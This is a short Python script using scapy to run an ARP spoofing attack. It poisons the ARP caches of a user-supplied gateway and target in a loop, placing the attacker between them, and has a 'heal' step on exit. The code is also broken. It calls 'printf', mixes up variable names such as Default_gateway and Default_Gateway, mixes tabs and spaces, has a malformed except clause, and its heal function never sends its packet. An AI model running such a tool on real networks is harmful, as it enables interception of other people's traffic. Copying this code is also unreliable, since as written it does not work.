import os
from scapy.all import *

print("Enter the Default Gateway Address to Attack : ")
Default_Gateway = input()

printf("Enter the Target Ip address : ")
Target = input()

count = 1
delay = 1

print("starting spoof")
def heal(Default_Gateway,Target):
	healpkt = ARP(op=2,psrc=Default_Gateway,hwsrc=getmacbyip(Default_Gateway),hwdst=getmacbyip(target),pdst=Target) 

def poisoned_arp(target,spoof):
	pkt = ARP(op = 2 ,psrc=spoof,pdst=target,hwdst=getmacbyip(target))
	send(pkt,verbose=False)

try:
	while(True):
		poisoned_arp(Default_gateway,Target)
		poisoned_arp(Target,Default_gateway)
		print(count)
                count+=1
		sleep(delay)
except:
	KeyboardInterrupt:
		print("Healing your system")
		heal(Default_Gateway,Target)
		heal(Target,Default_Gateway)
		print("Program Terminated ")
